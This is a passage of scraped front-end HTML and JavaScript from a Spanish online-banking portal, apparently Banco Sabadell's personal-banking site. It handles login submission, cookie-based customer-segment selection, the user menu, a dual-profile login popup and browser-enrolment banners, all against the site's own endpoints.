                if(cookieAceptacionCookies_SabAtl == "true" || cookieAceptacionCookies_BSAndorra=="true"){
                    var expdate = new Date();
                    expdate.setTime (expdate.getTime() + 365*(24 * 60 * 60 * 1000)); // 1 any  
                    setCookie("LOGINTYPE",div,expdate,"/");
                }
            }
            
            function myFormNewSubmit(e){
                if (document.myFormNew.action == document.location.href){
                    e.preventDefault();
                }
            }
         
            function callDoLoginMod(nameform){
                var contexto="/txbs/";
                var seg = readCookie("segmento");
                if(seg){
                    if(seg.charAt(0)=='P'){
                        contexto="/txbs/";
                    }
                }
                
                var formname = nameform;
                var languageTransaccional = 'CAS';
                
                if (typeof(formname) != 'undefined' && formname != null){
    
                    addInputForm(formname);
                
                    $("#accept").addClass("disabled").prop("disabled", true);       
                    $.ajax({
                        url: contexto+"LoginDNISCA.doLogin.bs?language="+languageTransaccional+"&key="+getKeyRandom(),
                        dataType: "json",
                        data: $("form[name='"+formname+"']").serialize(),
                        type: "POST",
                        success: function(response){
                            var result = $(response)[0].result.trim();
                            
                            if (result == "OK") {
                                setCookieLogout("logout","");
                                doActionSCA(formname, contexto+'LoginDNISCA.setLogged',languageTransaccional);
                            } else if (result == "SCA") {
                                callLoadLayout(formname,languageTransaccional,contexto);
                            } else {
                                callLoadLayout(formname,languageTransaccional,contexto);
                            }
                        },
                        error: function(error){
                            // Error login no controlado
                            callLoadLayout(formname,languageTransaccional,contexto);
                        },
                    });
                
                }
            }
            
            //]]>
        </script>

</div>



<table id="tablaDual" class="tablaDual" style="right: 430px;">
    <tbody>
        <tr>
            <td id="tablaDualPart" class="segmentoActual izquierda">
                <a href="/cs/Satellite/SabAtl/Particulares/1191332204474/es/">Particulares</a>
                <div id="trianguloPart" style="visibility: visible; left: 32.5px;"></div>
            </td>
            <td id="tablaDualEmp" class="segmentoOtro central">
                <a href="/cs/Satellite/SabAtl/Empresas/1191332202619/es/">Empresas</a>
                <div id="trianguloEmp"></div>
            </td>
            <td id="tablaDualBP" class="segmentoOtro derecha">
                <a href="/cs/Satellite/SabAtl/Banca-Privada/2000024744202/es/">Banca Privada</a>
                <div id="trianguloBP"></div>
            </td>
        </tr>
    </tbody>
</table>
<script type="text/javascript">
    //<![CDATA[
    var username = readCookie("username");
    var segmento = "Particulares";
    var segmentoLiteral = 'Particulares';
    if(segmento){
        if(segmento.charAt(0)=='P'){
        
            if(readCookie("BSOP_PP")!=null){
                if(readCookie("BSOP_PP").indexOf("BSO_URQ")!=-1){
                    segmentoLiteral = 'Banca Privada';
                }else{
                    segmentoLiteral = 'Particulares';
                }
            }else{
                segmentoLiteral = 'Particulares';
            }
            jQuery("#iconoNuevoUsuario").html('<span>D</span>');
        }else{
            segmentoLiteral = 'Empresas';
            jQuery("#iconoNuevoUsuario").removeClass( "iconoNuevoUsuarioP" ).addClass( "iconoNuevoUsuarioE" );
            jQuery("#iconoNuevoUsuario").html("<span>'</span>");
        }
    }
    
    var esTransaccional = null;
    var logout = false;
    if(username != null){
        jQuery("#tablaDual").css("display","none");
        jQuery("#nuevoNombreUsuario").text(username);
        jQuery("#nuevoSegmento").html(segmentoLiteral);
        jQuery("#newMenu").css("visibility","visible");
    }else{      
        jQuery(document).ready(function(){
            var bLoginModuleObsoleto = function(){
                if (typeof esNavegadorObsoleto != 'undefined'){ 
                        return esNavegadorObsoleto;
                }
                return false;
            }
            
            if((jQuery("#loginModule").length == 0) && (jQuery("#loginModuleEmpr").length == 0) && (esTransaccional != true) && (bLoginModuleObsoleto() != true)) { 
                jQuery("#newMenuLogin").css("margin-left",jQuery("#headerPart2").width() - jQuery("#newMenuLogin").width() + 17);
                jQuery("#newLogin").css("visibility","visible");
            }
            
            if(document.location.href.indexOf("doLogout.bs")!=-1){
                jQuery("#newMenuLogin").css("margin-left",jQuery("#headerPart2").width() - jQuery("#newMenuLogin").width() + 17);
                jQuery("#newLogin").css("visibility","visible");
            }
            
            if (bLoginModuleObsoleto()) {
                jQuery("#newMenuLogin").empty();
            }
        });
    }
    //]]>
</script>
<script type="text/javascript">
    //<![CDATA[
    var seg = readCookie("segmento");
    var urlPage = document.location.href;
    var isPageInversorBP = false;
    if (urlPage.indexOf("InversorBP")>0) {
        isPageInversorBP = true;
    }

    if(seg){
        if(seg.charAt(0)=='P' || isPageInversorBP){
            if(readCookie("isBancaPrivada") != null || isPageInversorBP){
                if(readCookie("isBancaPrivada").charAt(0)=='t' || isPageInversorBP){
                    jQuery("#trianguloBP").css("visibility","visible");
                    var despla2 = ((jQuery('.derecha').outerWidth() - 14)/2)-8 + "px";
                    jQuery("#trianguloBP").css("left",despla2);
                    jQuery("#tablaDualPart").attr("class","segmentoOtro izquierda");
                    jQuery("#tablaDualEmp").attr("class","segmentoOtro central");
                    jQuery("#tablaDualBP").attr("class","segmentoActual derecha");
                    var logoWidth = parseFloat(jQuery('#logoURImgNewHeader').width()); //es siempre igual
                    var posTablaDualRight = parseFloat(jQuery('#logoURImgNewHeader').position().left) + parseFloat(jQuery('#logoURImgNewHeader').width()) - 45 +"px";
                    jQuery(".tablaDual").css("right", "368px");
                    
                }else{
                    jQuery("#trianguloPart").css("visibility","visible");
                    var despla = ((jQuery('.izquierda').outerWidth() - 14)/2)-8 + "px";
                    jQuery("#trianguloPart").css("left",despla);
                    jQuery("#tablaDualPart").attr("class","segmentoActual izquierda");
                    jQuery("#tablaDualEmp").attr("class","segmentoOtro central");
                    jQuery("#tablaDualBP").attr("class","segmentoOtro derecha");
                    jQuery(".tablaDual").css("right", "430px");
                }
                
                jQuery('form[name="myFormNew"]').attr("action","/txbs/LoginDNISCA.doLogin.bs");
                jQuery("#enlaceCP").attr("href", "/cita-previa/landing/index-es.html");
                jQuery("#enlaceHC").attr("href", "/cs/Satellite/SabAtl/Hagase-Cliente/2000019036617/es/");
            }
        }else if(seg.charAt(0)=='E' || seg.charAt(0)=='F'){
            jQuery("#trianguloEmp").css("visibility","visible");
            var despla1 = ((jQuery('.central').outerWidth())/2)-22 + "px";
            jQuery("#trianguloEmp").css("left",despla1);
            jQuery("#tablaDualPart").attr("class","segmentoOtro izquierda");
            jQuery("#tablaDualEmp").attr("class","segmentoActual central");
            jQuery("#tablaDualBP").attr("class","segmentoOtro derecha");
            jQuery('form[name="myFormNew"]').attr("action","/txempbs/LoginDNISCA.doLogin.bs");
            jQuery("#enlaceCP").attr("href", "/cita-previa/landing/index-es.html");
            jQuery("#enlaceHC").attr("href", "/cs/Satellite/SabAtl/hacerse-cliente-negocio/6000036705792/es/");
        }
        
    }
    if (isPageInversorBP) {
        if(document.getElementById("logoURImgNewHeader")!=null){
            if(document.getElementById("logoURImgNewHeader").style.display=="none"){
                document.getElementById("logoURImgNewHeader").style.display="block";
        if(document.getElementById("logoBSImgNewHeader")!=null){
            document.getElementById("logoBSImgNewHeader").style.display="none";
        }
            }
        }
    }
    //]]>
</script>
</div>
    <style type="text/css">
    #botonCambioSabadellCAM {
      display: none;
     }
     #botonCambioBancoSabadell{
      display: none;
     }
    </style>
  
  
    
  
  
    <div id="menuUsuarioT" style="border-bottom: 8px solid rgb(244, 244, 245); border-right: 8px solid transparent; border-left: 8px solid transparent; width: 0px; height: 0px; display: none; position: absolute; top: 90px; margin-left: 912px;">
  </div><ul id="menuUsuario" style="display: none; width: 113.5px; margin-left: 826.5px;">
        <li class="opcionMenu">
        <a id="menuInicio" class="linkMenu" href="/txbs/ChangeLocale.init.bs?locale=CAS">Inicio<img width="27px" height="27px" id="cuentas" style="display:none;" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
        </li>
        <li class="opcionMenuWhite" id="alertMsg">
        <a href="/txbs/SVGetMail.init.bs?segmento=Particulares" class="linkMenu">Correspondencia<img width="27px" height="27px" id="msg" style="display:none;" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
        </li>
        <li class="opcionMenu" id="alertOp">
        <a class="linkMenu" href="/txbs/FCQuery2.init.bs?segmento=Particulares">Operaciones pendientes<img width="27px" height="27px" id="op" style="display:none" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
        </li>
		<li class="opcionMenuWhite" id="alertDoc">
        <a class="linkMenu" href="/txbs/DDPositionNew.init.bs?segmento=Particulares">Documentación Digital<img width="27px" height="27px" id="doc" style="display:none" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
        </li>
        <li class="opcionMenu" id="datosPersonales">
        <a class="linkMenu" href="/txbs/SVPersonDataCustomerMod.init.bs">Gestiones personales<img width="27px" height="27px" id="datos" style="display:none;" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
        </li>
		<li class="opcionMenu" id="miPerfil" style="display:none">
        <a class="linkMenu" href="/txbs/SVBridge.initMyprofile.bs">Mi perfil<img width="27px" height="27px" id="datos" style="display:none;" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
        </li>
    	<li class="opcionMenuWhite" id="MisCarteras" style="display:none">
        <a class="linkMenu" href="/txbs/PortfoliosQueryNew.init.bs?segmento=Particulares">Mis Carteras<img width="27px" height="27px" id="datos" style="display:none;" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
        </li>
        
		    
		    
		    
		    
		    
			
			
		    
			<li class="opcionMenuWhite" id="rateMyOperative" style="display: block;"><a class="linkMenu" href="javascript: void(0)" onclick="showUserSurvey('rateBSO','')">Valorar web</a></li>
			<li class="opcionMenu" id="misFinanzas" style="display:none">
				<a class="linkMenu" href="/txbs/SVMyFinances.init.bs">Tus finanzas<img width="27px" height="27px" id="doc" style="display:none" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
			</li>
			<li class="opcionMenu" id="comprasPendientes">
				<a class="linkMenu" href="/txbs/SVPersonDataCustomerMod.init.bs">Gestiones personales<img width="27px" height="27px" id="datos" style="display:none;" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""></a>
			</li>
      <li style="display:none;" class="loginDualOpt opcionMenu">
        <a class="linkMenu" onclick="loginDualRefreshPopUp()" id="popUpDualLi" href="#popUpDual">Cargando...</a>
      </li><script type="text/javascript">
			    //<![CDATA[
				var ie = /MSIE (\d+)/.exec(navigator.userAgent);
				ie = ie? ie[1] : null;
				if(ie && ie <= 9) {
					document.getElementById("rateMyOperative").outerHTML = "";
					document.getElementById("misFinanzas").className="opcionMenuWhite";
					document.getElementById("comprasPendientes").className="opcionMenu";
				}
				//]]>

        //Desarrollo Login Dual
        var literalesLoginDual = {
        	perfilPart: "Perfil Particular",
        	perfilEmp: "Perfil Empresa",
        	tituloPart: "Particular",
        	tituloEmp: "Empresa",
        	iconoEmp: "'",
        	iconoPart: "D"
        }
        var fixQuestionMark = false;
        var isLoginDualError = false;
        var usernameLoginDual = readCookie("username");
        var segmentoLoginDual = readCookie("segmento");
        var endPointLoginDual = "";

        if (usernameLoginDual != "" && usernameLoginDual) {
        	if (segmentoLoginDual.charAt(0)=='P') {
        		jQuery("#popUpDualLi").html("<span>"+literalesLoginDual.iconoEmp+"</span>" + literalesLoginDual.perfilEmp);
            endPointLoginDual = "/txbs";
        	} else {
        		jQuery("#popUpDualLi").html("<span>"+literalesLoginDual.iconoPart+"</span>" + literalesLoginDual.perfilPart);
            endPointLoginDual = "/txempbs";
        	}
          var bsoPPDual = readCookie("BSOP_PP");
          if (true) {
            if (bsoPPDual.includes("LOGIN_DUAL_SI") || bsoPPDual.includes("LOGIN_DUAL_NO")) {
              if (bsoPPDual.includes("LOGIN_DUAL_SI")) {
                var urlFixQuestionMark = window.location.href;
                if (urlFixQuestionMark.substr(urlFixQuestionMark.length - 1) == "?" || urlFixQuestionMark.slice(-2) == "bs") {
                  fixQuestionMark = true;
                }
                jQuery(".loginDualOpt").show();
              }
            } else {
              $.get(window.location.origin + endPointLoginDual +"/LoginFW.getInfo.bs", {}, function(data) {
                  var datosUsuarioGetInfo = JSON.parse(data);
                  if (datosUsuarioGetInfo[0].indPers) {
                    if (datosUsuarioGetInfo[0].indPers.indexOf("X") !== -1 || datosUsuarioGetInfo[0].indPers.indexOf("Y") !== -1) {
                      bsoPPDual = bsoPPDual + "|LOGIN_DUAL_SI";
                      setUnescapeCookie("BSOP_PP", bsoPPDual, 1);
                      jQuery(".loginDualOpt").show();
                      var urlFixQuestionMark = window.location.href;
                      if (urlFixQuestionMark.substr(urlFixQuestionMark.length - 1) == "?" || urlFixQuestionMark.slice(-2) == "bs") {
                        fixQuestionMark = true;
                      }
                    } else {
                      bsoPPDual = bsoPPDual + "|LOGIN_DUAL_NO";
                      setUnescapeCookie("BSOP_PP", bsoPPDual, 1);
                    }
                  } else {
                    bsoPPDual = bsoPPDual + "|LOGIN_DUAL_NO";
                    setUnescapeCookie("BSOP_PP", bsoPPDual, 1);
                  }
              });
            }
          }
        }
        $(document).ready(function(){
          if (usernameLoginDual != "" && usernameLoginDual) {
            var loginDualParte1 = jQuery("#popUpDualPat1").html();
            var loginDualParte2 = jQuery("#popUpDualPat2").html();
            var inputDual = '<input id="passwordDual" type="password" name="passwordDual">';
            var loginDualParte3 = jQuery("#popUpDualPat3").html();
            var loginDualFinal = "";
            if (segmentoLoginDual.charAt(0)=='P') {
              loginDualFinal = loginDualParte1.replace("#icono", literalesLoginDual.iconoEmp);
              loginDualFinal = loginDualFinal.replace("#nombreusuario", usernameLoginDual);
              loginDualFinal = loginDualFinal.replace("#titulo", literalesLoginDual.tituloEmp);
              loginDualFinal = loginDualFinal + loginDualParte2.replace("#inputDual", inputDual);
              loginDualFinal = loginDualFinal + loginDualParte3;
              jQuery("#popUpDualBody").html(loginDualFinal);
            } else {
              loginDualFinal = loginDualParte1.replace("#icono", literalesLoginDual.iconoPart);
              loginDualFinal = loginDualFinal.replace("#nombreusuario", usernameLoginDual);
              loginDualFinal = loginDualFinal.replace("#titulo", literalesLoginDual.tituloPart);
              loginDualFinal = loginDualFinal + loginDualParte2.replace("#inputDual", inputDual);
              loginDualFinal = loginDualFinal + loginDualParte3;
              jQuery("#popUpDualBody").html(loginDualFinal);
            }
            jQuery("#formDual").append('<input type="hidden" id="pinDual" name="pin" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="languageDual" name="language" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="msgLoginDual" name="msgLogin" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="signLoginDual" name="signLogin" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="userLanDual" name="evision.userLan" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="RSADeviceFsoDual" name="evision.RSADeviceFso" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="csidDual" name="evision.csid" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="deviceTokenCookieDual" name="evision.deviceTokenCookie" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="RSADevicePrintDual" name="evision.RSADevicePrint" value=""/>');
            jQuery("#formDual").append('<input type="hidden" id="userDNIDual" name="userDNI" value=""/>');
            $('#passwordDual').each(function() {
              var elem = $(this);
              elem.keyup(function(event) {
                  if (event.which === 13 && '' != elem.val()) {
                      doLoginDual();
                  }
              });
              elem.bind("propertychange change click keyup input paste", function(event){
                 if ('' != elem.val()) {
                  $('#submitLoginDual').prop('disabled', false);
                } else {
                  $('#submitLoginDual').prop('disabled', true);
                }
              });
            });
          }
        });
			</script>
			

      </ul><div id="lapizUsuario" class="liquid oculto"></div><div class="tooltipsLapiz" id="tooltipsLapiz" style="display: none"><span id="ventana" style="margin-left: 681.5px;">Firmas pendientes</span></div><div class="tooltipsLapizClick" id="tooltipsLapizClick" style="display: none; margin-left: 783px;"><a style="font-weight: normal;" href="/txbs/DDPositionNew.init.bs" id="enlaceFirmasGlobal">
          <div style="">
          <span style="line-height: 40px"><strong>Documentación digital</strong></span>
          <br>
          <span style="font-size: 10px;line-height: 0px">Acceda a todos sus contratos</span>
          </div>
        </a></div><div id="usuario" class="liquid oculto" style="visibility: hidden;"><div id="btnDesconectar"><input id="botonCambioSabadellCAM" class="btn tipo7" type="button" value="cambioAGui" onclick="cambioPortalGui()" style="margin-left: -5px; font-size: 1.1em; padding-top: 0; border:0px; width:180px; height:25px ">
        <input id="botonCambioBancoSabadell" class="btn tipo7" type="button" value="cambioASab" onclick="cambioPortalSab()" style="margin-left: -5px; font-size: 1.1em; padding-top: 0; border:0px; width:180px; height:25px "></div>
      <script type="text/javascript">
        //<![CDATA[
        




          
        var aux = jQuery('#utilities tr').find('td:first').innerWidth();
        jQuery("#menuCorp").css("width",aux);
        jQuery("#menuCorpT").css("margin-left",aux -47)
        jQuery("#menuUsuarioCabecera").click(function(y){
          if (jQuery('#menuUsuario').is( ":hidden" ) ) {
            jQuery('#menuUsuarioT').slideDown(0,function() {
              jQuery('#menuUsuario').slideDown("slow");
              jQuery('#flechaUsuario').addClass("icon-bs-icon-arriba");
              jQuery('#flechaUsuario').removeClass("icon-bs-icon-abajo");
            });
          } else {
            jQuery('#menuUsuario').slideUp("slow",function() {
              jQuery('#flechaUsuario').addClass("icon-bs-icon-abajo");
              jQuery('#flechaUsuario').removeClass("icon-bs-icon-arriba");
              jQuery('#menuUsuarioT').slideUp(0);
            });
          }
        });
        jQuery("#menuCuentas").click(function(z){
          var perfilesUsuario = getCookie('BSOP_PP') || '';
          if ((perfilesUsuario.indexOf("BSOP_DEFAULT")!=-1 || perfilesUsuario.indexOf("BSOP_SABINV")!=-1) && "Particulares"=='Particulares') {
            doSessionTransfer_BSOPlus('/CUGlobalPositionNewProteoAS.init.bs','/txglobalpositionbs/spring/globalPosition-flow','txglobalpositionbs','SabAtl','Particulares','si','txbs/','es')
          } else {
            document.location.href = '/txbs/CUGlobalPositionNew.init.bs';
          }
        });

        var classSiguienteEnlace = "opcionMenu";
        if (readCookie("username") !=null){
			if ("Particulares"=='Particulares'){
				if(document.getElementById("alertMsg")!=null){
				  document.getElementById("alertMsg").style.display = 'none';
				}
				if(document.getElementById("alertOp")!=null){
				  document.getElementById("alertOp").style.display = 'none';
				}
				if(document.getElementById("datosPersonales")!=null){
				  document.getElementById("datosPersonales").style.display = 'none';
				}
				if(document.getElementById("miPerfil")!=null){
				  document.getElementById("miPerfil").style.display = 'block';
				}
				classSiguienteEnlace = "opcionMenuWhite";

				if(readCookie("BSOP_PP")!=null){
				  var perfilUsuario = getCookie("BSOP_PP");
				  if(perfilUsuario.indexOf("BSO_URQ") !=-1){
					//Es Particulares BancaPrivada
					if(document.getElementById("logoURImgNewHeader")!=null){
					  if(document.getElementById("logoURImgNewHeader").style.display=="none"){
						document.getElementById("logoURImgNewHeader").style.display="block";
						document.getElementById("logoBSImgNewHeader").style.display="none";
					  }
					}
					//Si el usuario tiene perfil urquijo se muestra en el menu de usuario la opcion MisCarteras
					if(document.getElementById("MisCarteras")!=null){
					  document.getElementById("MisCarteras").style.display = 'block';
					}
					classSiguienteEnlace = "opcionMenu";
				  }
				}
			} else{
				//Es Empresa
				if(readCookie("isBancaPrivada") !=null){
				  if(readCookie("isBancaPrivada").charAt(0)=='t'){
					if(document.getElementById("logoURImgNewHeader")!=null){
					  if(document.getElementById("logoURImgNewHeader").style.display=="none"){
						document.getElementById("logoURImgNewHeader").style.display="block";
						document.getElementById("logoBSImgNewHeader").style.display="none";
					  }
					}
				  }
				}
				classSiguienteEnlace = "opcionMenuWhite";
			}
        } else {
          if(readCookie("isBancaPrivada") !=null){
            if(readCookie("isBancaPrivada").charAt(0)=='t'){
              if(document.getElementById("logoURImgNewHeader")!=null){
                if(document.getElementById("logoURImgNewHeader").style.display=="none"){
                  document.getElementById("logoURImgNewHeader").style.display="block";
                  document.getElementById("logoBSImgNewHeader").style.display="none";
                }
              }
            }
          }
          classSiguienteEnlace = "opcionMenuWhite";
        }
        //Se comprueba si es IE inferior a 9 para ocultar opcion rateMyOperative o mastrarla
        var ie = /MSIE (\d+)/.exec(navigator.userAgent);
        ie = ie? ie[1] : null;
        if(ie && ie <= 9) {
          if(document.getElementById("rateMyOperative")!=null){
            document.getElementById("rateMyOperative").style.display="none";
          }
        } else{
          if(document.getElementById("rateMyOperative")!=null){
            document.getElementById("rateMyOperative").style.display="block";
            document.getElementById("rateMyOperative").className = classSiguienteEnlace;
            if (classSiguienteEnlace == "opcionMenuWhite") {
            	classSiguienteEnlace = "opcionMenu";
            } else {
            	classSiguienteEnlace = "opcionMenuWhite";
            }
          }
        }

        //Se comprueba el perfil del usuario para mostrar o no la opcion de mis finanzas
        var misFinanzasP4Html = '<a class="linkMenu" href="/txbs/P4CDNLanding.init.bs?portal=myfinances&version=0&mfe=myfinances-aisp-bso">Tus finanzas<img width="27px" height="27px" id="doc" style="display:none" name="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_alerta.png" class=""/></a>';
        document.getElementById("misFinanzas").className=classSiguienteEnlace;
        if(getCookie("username") !=null){
          if(getCookie('BSOP_PP')!=null){
            if(document.getElementById("misFinanzas")!=null){
              var perfilesMF = "PIBOT|";
              var perfilesMFP4 = "MENU_PISAP4|";
              if(perfilesMF != ""){
                var arrayPerfilesMF = perfilesMF.split("|");
                var perfilUsuario = getCookie('BSOP_PP');
                var mostrarMF = false;
                for (i = 0; i<arrayPerfilesMF.length; i++) {
                  var perfilMF = arrayPerfilesMF[i];
                  if(perfilMF != ""){
                    if (perfilUsuario.indexOf(perfilMF)!=-1 ) {
                      mostrarMF = true
                    }
                  }
                }
                if (perfilesMFP4 != "") {
                  var arrayPerfilesMFP4 = perfilesMFP4.split("|");
                  for (i = 0; i<arrayPerfilesMFP4.length; i++) {
                    var perfilMFP4 = arrayPerfilesMFP4[i];
                    if(perfilMFP4 != ""){
                      if (perfilUsuario.indexOf(perfilMFP4)!=-1 ) {
                        jQuery("#misFinanzas").html(misFinanzasP4Html);
                        mostrarMF = true
                      }
                    }
                  }
                }
                if (mostrarMF) {
					document.getElementById("misFinanzas").style.display="block";
					if (classSiguienteEnlace == "opcionMenuWhite") {
						classSiguienteEnlace = "opcionMenu";
					} else {
						classSiguienteEnlace = "opcionMenuWhite";
					}
                }
              }else{
                if (perfilesMFP4 != "") {
                  var arrayPerfilesMFP4 = perfilesMFP4.split("|");
                  var perfilUsuario = getCookie('BSOP_PP');
                  for (i = 0; i<arrayPerfilesMFP4.length; i++) {
                    var perfilMFP4 = arrayPerfilesMFP4[i];
                    if(perfilMFP4 != ""){
                      if (perfilUsuario.indexOf(perfilMFP4)!=-1 ) {
                        jQuery("#misFinanzas").html(misFinanzasP4Html);
                      }
                    }
                  }
                }
				document.getElementById("misFinanzas").style.display="block";
				if (classSiguienteEnlace == "opcionMenuWhite") {
					classSiguienteEnlace = "opcionMenu";
				} else {
					classSiguienteEnlace = "opcionMenuWhite";
				}
              }
            }
          }
        }
        document.getElementById("comprasPendientes").className=classSiguienteEnlace;
	//]]>
   </script><style>
            #mbox{background-color:#eee; padding:8px; border:2px outset #666;}
            #mbm{font-family:sans-serif;font-weight:bold;float:right;padding-bottom:5px;}
            #ol{background-image: url(overlay.png);}
            .dialog {display:none}
            .dialink {cursor:pointer; color:#900;text-decoration:underline;}
    </style>
    <script type="text/javascript">
      //<![CDATA[
      function post_to_url(path, params, method) {
        method = method || "post";
        var form = document.createElement("form");
        form.setAttribute("method", method);
        form.setAttribute("action", path);
        for(var key in params) {
          var hiddenField = document.createElement("input");
          hiddenField.setAttribute("type", "hidden");
          hiddenField.setAttribute("name", key);
          hiddenField.setAttribute("value", params[key]);
          form.appendChild(hiddenField);
        }
        document.body.appendChild(form);
        form.submit();
      }
      function Cancelar1(){
        hm('boxActualizar1');
        visible=false;
      }
      function Continuar1(){
        hm('boxActualizar1');
        visible=false;
        var expdate = new Date();
        expdate.setTime (expdate.getTime() - (24 * 60 * 60 * 1000));
        SetCookie ("interOpBS", "" , expdate, "/");
        document.getElementById('botonCambioSabadellCAM').style.display = 'none';
        document.getElementById('botonCambioBancoSabadell').style.display = 'none';
        post_to_url('SVCrypto.init.bs', {"tag" : "ASES","option" : "crypt"})
      }
      function Cancelar2(){
        hm('boxActualizar2');
        visible=false;
      }
      function Continuar2() {
        hm('boxActualizar2');
        visible=false;
        var expdate = new Date();
        expdate.setTime (expdate.getTime() - (24 * 60 * 60 * 1000));
        SetCookie ("interOpBS", "" , expdate, "/");
        document.getElementById('botonCambioSabadellCAM').style.display = 'none';
        document.getElementById('botonCambioBancoSabadell').style.display = 'none';
        if(readCookie('segmento') != null) {
          if(readCookie('segmento').charAt(0)=='P'){
            window.open("/txbs/SVDispatch.SVDispathLoginDNI.bs");
          }else{
            window.open("/txempbs/SVDispatch.SVDispathLoginDNI.bs");
          }
        }
      }
      function Cancelar3(){
        hm('boxActualizar3');
        visible=false;
      }
      function Continuar3(){
        hm('boxActualizar3');
        visible=false;
        var expdate = new Date();
        expdate.setTime (expdate.getTime() - (24 * 60 * 60 * 1000));
        SetCookie ("interOpBS", "" , expdate, "/");
        document.getElementById('botonCambioSabadellCAM').style.display = 'none';
        document.getElementById('botonCambioBancoSabadell').style.display = 'none';
        post_to_url('SVCrypto.init.bs', {"tag" : "ASES","option" : "crypt"})
      }
      function Cancelar4(){
        hm('boxActualizar4');
        visible=false;
      }
      function Continuar4(){
        hm('boxActualizar4');
        visible=false;
        var expdate = new Date();
        expdate.setTime (expdate.getTime() - (24 * 60 * 60 * 1000));
        SetCookie ("interOpBS", "" , expdate, "/");
        document.getElementById('botonCambioSabadellCAM').style.display = 'none';
        document.getElementById('botonCambioBancoSabadell').style.display = 'none';
        if(readCookie('segmento') != null){
          if(readCookie('segmento').charAt(0)=='P'){
            window.open("/txbg/SVDispatch.SVDispathLoginDNI.bs");
          }else{
            window.open("/txempbg/SVDispatch.SVDispathLoginDNI.bs");
          }
        }
      }
      //]]>
    </script>
    <script type="text/javascript">
          //<![CDATA[
          function cambioPortalGui() {
            var interBS_cookie = readCookie('interOpBS');
            var interBS = interBS_cookie.charAt(0) + interBS_cookie.charAt(1);
            if(interBS == "SS") {
              initmb();
              ShowModal("boxActualizar1", 550, 350);
            }else {
              initmb();
              ShowModal("boxActualizar2", 550, 350);
            }
          }
          //]]>
        </script>
       <script language="text/javascript">
       //<![CDATA[
        function processCookieInterOp() {
        }
      //]]>
      </script>
      <script type="text/javascript">
      //<![CDATA[
      var context='';
      if(readCookie('BSOP_PP')!=null) {
        if (readCookie('BSOP_PP').indexOf("BSO_CCENTER") !== -1) {
          if(readCookie('segmento') != null) {
            if(readCookie('segmento').charAt(0)=='P') context='/txcc/';
            else context='/txempbscc/';
          }
          if(readCookie('IberMarketOperations')=="true"){
            var botonRegistro = document.createElement("input");
            botonRegistro.setAttribute("type", "button");
            botonRegistro.setAttribute("name", "Registro");
            botonRegistro.setAttribute("value", "Registro");
            botonRegistro.setAttribute("style", "width:6em;font:1.1em arial");
            botonRegistro.onclick=function() {location.href=context+'null';};
            document.getElementById('newDesca').appendChild(botonRegistro);
            var botonConsulta = document.createElement("input");
            botonConsulta.setAttribute("type", "button");
            botonConsulta.setAttribute("name", "Consulta");
            botonConsulta.setAttribute("value", "Consulta");
            botonConsulta.setAttribute("style", "width:6em;font:1.1em arial");
            botonConsulta.onclick=function() {location.href=context+'IberMarketOrderQuery.init.bs';};
            document.getElementById('newDesca').appendChild(botonConsulta);
          }else{
            var botonValidarClaves = document.createElement("input");
            botonValidarClaves.setAttribute("type", "button");
            botonValidarClaves.setAttribute("name", "ValidarClaves");
            botonValidarClaves.setAttribute("value", "Validar Claves");
            botonValidarClaves.setAttribute("style", "width:8.5em;font:1.1em arial;position:absolute;top:-20px;right:350px");
            botonValidarClaves.onclick=function() {location.href=context+'ValidateKeys.init.bs';};
            document.getElementById('newDesca').appendChild(botonValidarClaves);
          }
        }
      }
      //]]>
    </script></div>


				
				
				
				
				
			
				
				
				
				
			<div data-id="alert-fixed-ok" style="display: none" class="banner-enroll-fixed">
	<div class="banner-enroll-container">
		<div class="close"> <img src="https://www.bancsabadell.com/StaticFiles/GrupoBS/img/close-white.png" alt="close"></div>
		<div class="banner-enroll-content">
			<div data-time="15" class="comp-timer">
				<div class="countdown">
					<svg class="bg">
						<circle r="15" cx="20" cy="20" stroke-dasharray="0" stroke-dashoffset="0"></circle>
					</svg>
					<svg class="path">
						<circle r="15" cx="20" cy="20" stroke-dasharray="0" stroke-dashoffset="0"></circle>
					</svg>
					<div class="countdown-number">&nbsp;</div>
				</div>
			</div>
			<div class="comp-body">
				<h4>¡Genial! Este es tu navegador habitual</h4>
				<p>Ahora acceder a tus cuentas desde este navegador será más rápido.</p>
			</div>
		</div>
	</div>
</div>
				
				
				
				
				
			
				
				
				
				
			<div data-id="alert-fixed-ko" style="display: none" class="banner-enroll-fixed">
	<div class="banner-enroll-container">
		<div class="close"> <img src="https://www.bancsabadell.com/StaticFiles/GrupoBS/img/close-white.png" alt="close"></div>
		<div class="banner-enroll-content">
			<div data-time="15" class="comp-timer">
				<div class="countdown">
					<svg class="bg">
						<circle r="15" cx="20" cy="20" stroke-dasharray="0" stroke-dashoffset="0"></circle>
					</svg>
					<svg class="path">
						<circle r="15" cx="20" cy="20" stroke-dasharray="0" stroke-dashoffset="0"></circle>
					</svg>
					<div class="countdown-number">&nbsp;</div>
				</div>
			</div>
			<div class="comp-body">
				<h4>¡Entendido!</h4>
				<p>Recuerda que si accedes desde un navegador desde el que no sueles conectarte reforzaremos las medidas de seguridad para confirmar tu identidad.</p>
			</div>
		</div>
	</div>
</div>
				<script type="text/javascript">
					var theSite = 'SabAtl';
					if(typeof(createCookie))
					{
